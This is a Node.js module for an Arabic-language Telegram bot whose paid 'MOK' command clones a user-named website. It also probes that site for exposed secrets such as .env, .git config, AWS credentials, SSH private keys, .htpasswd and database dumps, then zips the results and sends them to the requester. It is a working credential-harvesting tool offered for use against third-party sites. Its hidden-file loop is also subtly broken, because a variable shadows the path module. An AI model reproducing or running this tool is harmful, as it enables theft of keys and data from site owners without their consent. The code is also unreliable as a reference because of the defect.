const axios = require('axios');
const fs = require('fs');
const path = require('path');
const cheerio = require('cheerio');
const archiver = require('archiver');
const { URL } = require('url');

// آيدي القناة المطلوبة لإرسال إشعار التنفيذ
const LOG_CHANNEL_ID = '-1004457851009';
const DB_PATH = path.resolve(__dirname, '../قاعده.json');

// ======== قائمة الامتدادات للملفات المخفية و API ========
const HIDDEN_EXTENSIONS = [
    '.env', '.git', '.gitignore', '.htaccess', '.htpasswd',
    '.aws', '.ssh', '.config', '.npmrc', '.yarnrc',
    '.eslintrc', '.prettierrc', '.babelrc', '.editorconfig'
];

const API_EXTENSIONS = [
    '.json', '.xml', '.yaml', '.yml', '.graphql', '.gql',
    '.proto', '.pb', '.thrift', '.avro'
];

const DB_EXTENSIONS = [
    '.db', '.sqlite', '.sqlite3', '.sql', '.mysql',
    '.postgres', '.mongo', '.redis', '.dump', '.backup'
];

const SENSITIVE_FILES = [
    'package.json', 'package-lock.json', 'yarn.lock',
    'composer.json', 'composer.lock', 'Gemfile', 'Gemfile.lock',
    'requirements.txt', 'Pipfile', 'Pipfile.lock', 'poetry.lock',
    'Cargo.toml', 'Cargo.lock', 'go.mod', 'go.sum',
    'config.json', 'config.yaml', 'config.yml', 'settings.json',
    'appsettings.json', 'web.config', 'app.config',
    'database.yml', 'database.json', 'db.config',
    'credentials.json', 'credentials.yaml',
    'secret.json', 'secrets.json', 'secret.yaml',
    'api_keys.json', 'keys.json', 'tokens.json',
    '.npmrc', '.yarnrc', '.env.local', '.env.production',
    'docker-compose.yml', 'docker-compose.yaml', 'Dockerfile',
    'Makefile', 'CMakeLists.txt', 'build.gradle', 'pom.xml'
];

// ======== دوال إضافية ========
async function downloadFile(url, outputPath, cookies = '', retries = 2) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await axios({
                method: 'get',
                url: url,
                responseType: 'arraybuffer',
                timeout: 15000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0',
                    'Cookie': cookies,
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            });
            ensureDir(path.dirname(outputPath));
            fs.writeFileSync(outputPath, response.data);
            return true;
        } catch (_) {
            if (i === retries - 1) return false;
        }
    }
}

function ensureDir(dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
}

function toAbsoluteUrl(baseUrl, relative) {
    if (!relative || relative.startsWith('data:') || relative.startsWith('javascript:') || relative.startsWith('#')) return null;
    try {
        return new URL(relative, baseUrl).href;
    } catch (_) {
        return null;
    }
}

// دالة لقراءة قاعدة البيانات
function loadDatabase() {
    try {
        if (fs.existsSync(DB_PATH)) {
            const data = fs.readFileSync(DB_PATH, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {
        console.error("Error reading قاعده.json:", e);
    }
    return [];
}

// دالة لحفظ قاعدة البيانات
function saveDatabase(data) {
    try {
        fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {
        console.error("Error saving قاعده.json:", e);
    }
}

// ======== اكتشاف مسارات API و الملفات المخفية ========
function discoverApiEndpoints(htmlContent, baseUrl) {
    const endpoints = new Set();
    const patterns = [
        /\/api\/[^\s'"]+/gi,
        /\/v\d\/[^\s'"]+/gi,
        /\/graphql[^\s'"]*/gi,
        /\/rest\/[^\s'"]+/gi,
        /\/rpc\/[^\s'"]+/gi,
        /\/service\/[^\s'"]+/gi,
        /\/endpoint\/[^\s'"]+/gi,
        /\/webhook\/[^\s'"]+/gi,
        /\/callback\/[^\s'"]+/gi,
        /\/\.env[^\s'"]*/gi,
        /\/\.git[^\s'"]*/gi,
        /\/\.aws[^\s'"]*/gi,
        /\/\.ssh[^\s'"]*/gi,
        /\/config[^\s'"]*\.(json|yaml|yml)/gi,
        /\/secret[^\s'"]*\.(json|yaml|yml)/gi,
        /\/credentials[^\s'"]*\.(json|yaml|yml)/gi,
        /\/database[^\s'"]*\.(db|sqlite|sql)/gi,
        /\/package\.json/gi,
        /\/composer\.json/gi,
        /\/requirements\.txt/gi
    ];

    for (let pattern of patterns) {
        const matches = htmlContent.match(pattern);
        if (matches) {
            for (let match of matches) {
                const absolute = toAbsoluteUrl(baseUrl, match);
                if (absolute) endpoints.add(absolute);
            }
        }
    }

    const jsMatches = htmlContent.match(/<script[^>]*>([\s\S]*?)<\/script>/gi);
    if (jsMatches) {
        for (let script of jsMatches) {
            const fetchMatches = script.match(/fetch\(['"]([^'"]+)['"]/gi);
            if (fetchMatches) {
                for (let fm of fetchMatches) {
                    const urlMatch = fm.match(/['"]([^'"]+)['"]/);
                    if (urlMatch) {
                        const absolute = toAbsoluteUrl(baseUrl, urlMatch[1]);
                        if (absolute) endpoints.add(absolute);
                    }
                }
            }
            const xhrMatches = script.match(/\.open\(['"](?:GET|POST|PUT|DELETE)['"],\s*['"]([^'"]+)['"]/gi);
            if (xhrMatches) {
                for (let xm of xhrMatches) {
                    const urlMatch = xm.match(/['"]([^'"]+)['"]/);
                    if (urlMatch) {
                        const absolute = toAbsoluteUrl(baseUrl, urlMatch[1]);
                        if (absolute) endpoints.add(absolute);
                    }
                }
            }
        }
    }

    return Array.from(endpoints);
}

// ======== محاولة جلب الملفات المخفية الشائعة ========
async function tryFetchHiddenFiles(baseUrl, cookies, tempDir) {
    const downloaded = [];
    const commonPaths = [
        '/.env', '/.git/config', '/.git/HEAD', '/.git/index',
        '/.aws/credentials', '/.ssh/id_rsa', '/.ssh/id_rsa.pub',
        '/config.json', '/config.yaml', '/config.yml',
        '/settings.json', '/appsettings.json',
        '/database.db', '/database.sqlite', '/db.sqlite',
        '/package.json', '/composer.json', '/requirements.txt',
        '/.htaccess', '/.htpasswd',
        '/.npmrc', '/.yarnrc',
        '/.eslintrc.json', '/.prettierrc.json',
        '/docker-compose.yml', '/Dockerfile',
        '/Makefile', '/CMakeLists.txt',
        '/build.gradle', '/pom.xml',
        '/secret.json', '/secrets.json',
        '/credentials.json', '/api_keys.json',
        '/tokens.json', '/keys.json'
    ];

    for (let path of commonPaths) {
        const url = `${baseUrl}${path}`;
        try {
            const fileName = path.replace(/^\//, '').replace(/\//g, '_');
            const localPath = path.join(tempDir, 'hidden_files', fileName);
            const success = await downloadFile(url, localPath, cookies, 1);
            if (success) {
                downloaded.push({ url: url, localPath: localPath, name: fileName });
            }
        } catch (_) {}
    }
    return downloaded;
}

// ======== محاولة جلب ملفات API ========
async function tryFetchApiFiles(apiEndpoints, cookies, tempDir) {
    const downloaded = [];
    for (let endpoint of apiEndpoints) {
        try {
            const parsed = new URL(endpoint);
            let fileName = parsed.pathname.replace(/^\//, '').replace(/\//g, '_');
            if (!fileName || fileName === '') {
                fileName = `api_${Date.now()}_${Math.random().toString(36).substring(7)}.json`;
            }
            if (!fileName.includes('.')) {
                fileName += '.json';
            }
            const localPath = path.join(tempDir, 'api_files', fileName);
            const success = await downloadFile(endpoint, localPath, cookies, 1);
            if (success) {
                downloaded.push({ url: endpoint, localPath: localPath, name: fileName });
            }
        } catch (_) {}
    }
    return downloaded;
}

// ======== الوظيفة الرئيسية ========
module.exports = (bot) => {
    const activeRequests = new Map();

    bot.command('MOK', (ctx) => {
        const userId = ctx.from.id;
        const usersList = loadDatabase();

        // فحص امتلاك 15 نقطة على الأقل قبل تفعيل الوضع
        const userIndex = usersList.findIndex(user => user.id === userId);
        if (userIndex === -1 || usersList[userIndex].points < 15) {
            return ctx.reply("ليس معك نقاط");
        }

        activeRequests.set(userId, true);
        ctx.reply(
            '📥 **تم تفعيل وضع الاستنساخ الشامل (بأسماء الملفات الأصلية بدون تعديل)!**\n' +
            'أرسل رابط الموقع للبدء في تحميل جميع الملفات والمجلدات بأسمائها الحقيقية.\n\n' +
            '🔍 **سيتم جلب:**\n' +
            '• جميع ملفات HTML، CSS، JS، الصور\n' +
            '• ملفات API ونقاط النهاية\n' +
            '• الملفات المخفية (.env, .git, .aws, .ssh)\n' +
            '• قواعد البيانات (.db, .sqlite, .sql)\n' +
            '• ملفات التكوين (config, settings, secrets)\n' +
            '• الملفات الحساسة (credentials, keys, tokens)\n\n' +
            '💡 *ملاحظة:* أرسل الرابط متبوعاً بـ `COOKIE:` إن كان الموقع يتطلب تسجيل دخول.'
        );
    });

    bot.use(async (ctx, next) => {
        if (ctx.message?.text && activeRequests.has(ctx.from.id)) {
            const userId = ctx.from.id;
            
            // تحقق إضافي سريع من النقاط
            let usersList = loadDatabase();
            let userIndex = usersList.findIndex(user => user.id === userId);
            if (userIndex === -1 || usersList[userIndex].points < 15) {
                activeRequests.delete(userId);
                return ctx.reply("ليس معك نقاط");
            }

            const input = ctx.message.text.trim();
            activeRequests.delete(userId);

            let url = input;
            let userCookies = '';
            if (input.includes('COOKIE:')) {
                const parts = input.split('COOKIE:');
                url = parts[0].trim();
                userCookies = parts[1].trim();
            }

            // إرسال رسالة تأكيد الدفع فوراً وعدم التراجع
            await ctx.reply("تم تاكيد الدفع لايوجد تراجع");

            let statusMsg = await ctx.reply('⏳ جاري جلب جميع ملفات الموقع (HTML, CSS, JS, API, قواعد البيانات, الملفات المخفية)...');

            const tempDir = path.join(__dirname, 'temp_' + Date.now());
            ensureDir(tempDir);

            try {
                const { data: htmlContent } = await axios.get(url, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0',
                        'Cookie': userCookies,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'ar,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br'
                    },
                    timeout: 30000
                });

                const baseUrl = url;
                const $ = cheerio.load(htmlContent);
                const downloadedResources = new Map();
                let totalFiles = 0;

                function getLocalPathAndRelative(absoluteUrl, currentFilePath) {
                    const parsed = new URL(absoluteUrl);
                    let pathname = parsed.pathname;
                    let cleanPath = pathname.replace(/^\/+/, '');
                    if (!cleanPath || cleanPath.endsWith('/')) {
                        cleanPath += 'main_page.html';
                    }
                    const localPath = path.join(tempDir, cleanPath);
                    const relativePath = path.relative(path.dirname(currentFilePath), localPath).replace(/\\/g, '/');
                    return { localPath, relativePath };
                }

                const parsedMainUrl = new URL(baseUrl);
                let mainFileName = path.basename(parsedMainUrl.pathname);
                if (!mainFileName || !mainFileName.includes('.')) {
                    mainFileName = 'index_original.html';
                }
                const mainHtmlPath = path.join(tempDir, mainFileName);

                async function processResource(absoluteUrl, currentFilePath) {
                    if (downloadedResources.has(absoluteUrl)) {
                        return downloadedResources.get(absoluteUrl);
                    }
                    const { localPath, relativePath } = getLocalPathAndRelative(absoluteUrl, currentFilePath);
                    const success = await downloadFile(absoluteUrl, localPath, userCookies);

                    if (success) {
                        totalFiles++;
                        downloadedResources.set(absoluteUrl, relativePath);
                        const ext = path.extname(localPath).toLowerCase();

                        if (ext === '.css') {
                            try {
                                let cssText = fs.readFileSync(localPath, 'utf8');
                                const urlRegex = /url\((['"]?)([^'"]+?)\1\)/g;
                                let match;
                                while ((match = urlRegex.exec(cssText)) !== null) {
                                    const subUrl = match[2];
                                    const absSubUrl = toAbsoluteUrl(absoluteUrl, subUrl);
                                    if (absSubUrl) {
                                        const subRelPath = await processResource(absSubUrl, localPath);
                                        if (subRelPath) {
                                            cssText = cssText.replace(match[0], `url("${subRelPath}")`);
                                        }
                                    }
                                }
                                fs.writeFileSync(localPath, cssText, 'utf8');
                            } catch (_) {}
                        }
                        return relativePath;
                    }
                    return null;
                }

                const promises = [];
                const selectors = [
                    { selector: 'link', attr: 'href' },
                    { selector: 'script', attr: 'src' },
                    { selector: 'img', attr: 'src' },
                    { selector: 'img', attr: 'data-src' },
                    { selector: 'img', attr: 'srcset' },
                    { selector: 'source', attr: 'src' },
                    { selector: 'video', attr: 'src' },
                    { selector: 'audio', attr: 'src' },
                    { selector: 'iframe', attr: 'src' },
                    { selector: '[style]', attr: 'style' }
                ];

                selectors.forEach(({ selector, attr }) => {
                    $(selector).each((_, el) => {
                        let val = $(el).attr(attr);
                        if (!val) return;

                        if (attr === 'style') {
                            const bgMatch = val.match(/url\((['"]?)([^'"]+?)\1\)/);
                            if (bgMatch) val = bgMatch[2];
                            else return;
                        }

                        if (attr === 'srcset') {
                            val = val.split(',')[0].trim().split(' ')[0];
                        }

                        const absoluteUrl = toAbsoluteUrl(baseUrl, val);
                        if (absoluteUrl) {
                            promises.push(
                                processResource(absoluteUrl, mainHtmlPath).then(newRelPath => {
                                    if (newRelPath) {
                                        if (attr === 'style') {
                                            $(el).attr('style', `background-image: url("${newRelPath}")`);
                                        } else {
                                            $(el).attr(attr, newRelPath);
                                        }
                                    }
                                })
                            );
                        }
                    });
                });

                await Promise.all(promises);
                fs.writeFileSync(mainHtmlPath, $.html(), 'utf8');

                // جلب ملفات API
                await ctx.reply('🔍 جاري اكتشاف وجلب ملفات API...');
                const apiEndpoints = discoverApiEndpoints(htmlContent, baseUrl);
                const apiFiles = await tryFetchApiFiles(apiEndpoints, userCookies, tempDir);
                totalFiles += apiFiles.length;

                // جلب الملفات المخفية
                await ctx.reply('🔍 جاري جلب الملفات المخفية (.env, .git, .aws, .ssh)...');
                const hiddenFiles = await tryFetchHiddenFiles(baseUrl, userCookies, tempDir);
                totalFiles += hiddenFiles.length;

                if (apiEndpoints.length > 0) {
                    const apiListPath = path.join(tempDir, 'discovered_apis.json');
                    fs.writeFileSync(apiListPath, JSON.stringify(apiEndpoints, null, 2));
                    totalFiles++;
                }

                // التجميع في ZIP
                await ctx.reply('📦 جاري تجميع الملفات في ملف مضغوط...');
                const zipPath = path.join(__dirname, `site_complete_${Date.now()}.zip`);
                const output = fs.createWriteStream(zipPath);
                const archive = archiver('zip', { zlib: { level: 9 } });

                await new Promise((resolve, reject) => {
                    output.on('close', resolve);
                    archive.on('error', reject);
                    archive.pipe(output);
                    archive.directory(tempDir, false);
                    archive.finalize();
                });

                // إرسال الملف المضغوط للمستخدم
                await ctx.replyWithDocument(
                    { source: zipPath, filename: `complete_site_${Date.now()}.zip` },
                    { 
                        caption: `✅ **تم استنساخ جميع الملفات بنجاح!**\n` +
                                 `📁 **إجمالي الملفات:** ${totalFiles}\n` +
                                 `🔍 **ملفات API مكتشفة:** ${apiEndpoints.length}\n` +
                                 `🔒 **ملفات مخفية:** ${hiddenFiles.length}\n` +
                                 `📄 **جميع الملفات بأسمائها الأصلية دون تعديل**`
                    }
                );

                // ======== تمت العملية بنجاح كامل، الآن فقط يتم خصم 15 نقطة وحفظها ========
                usersList[userIndex].points -= 15;
                saveDatabase(usersList);

                // إرسال إشعار للقناة المحددة
                const username = ctx.from.username ? `@${ctx.from.username}` : (ctx.from.first_name || "مستخدم");
                const logMessage = 
                    `༺━━━━━━━━━━━━༻\n` +
                    `تم اكمال طلب بنجاح√\n` +
                    `الطلب: جلب ملفات المواقع (MOK)\n` +
                    `المستخدم: ${username}\n` +
                    `الوقت: 2026\n` +
                    `نشكركم ل استخدام بوت سيراف🥀\n` +
                    `༺━━━━━━━━━━━━༻`;

                await bot.telegram.sendMessage(LOG_CHANNEL_ID, logMessage).catch((err) => {
                    console.error("فشل إرسال الإشعار للقناة:", err);
                });

                // تنظيف الملفات المؤقتة
                fs.rmSync(tempDir, { recursive: true, force: true });
                fs.unlinkSync(zipPath);
                
                await bot.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});

            } catch (error) {
                await bot.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
                // لو حدث أي خطأ أثناء التنفيذ، لن يتم خصم النقاط نهائياً
                await ctx.reply(`❌ حدث خطأ أثناء الاستنساخ، ولم يتم خصم أي نقاط منك:\n${error.message}`);
                if (fs.existsSync(tempDir)) {
                    fs.rmSync(tempDir, { recursive: true, force: true });
                }
            }
        } else {
            return next();
        }
    });
};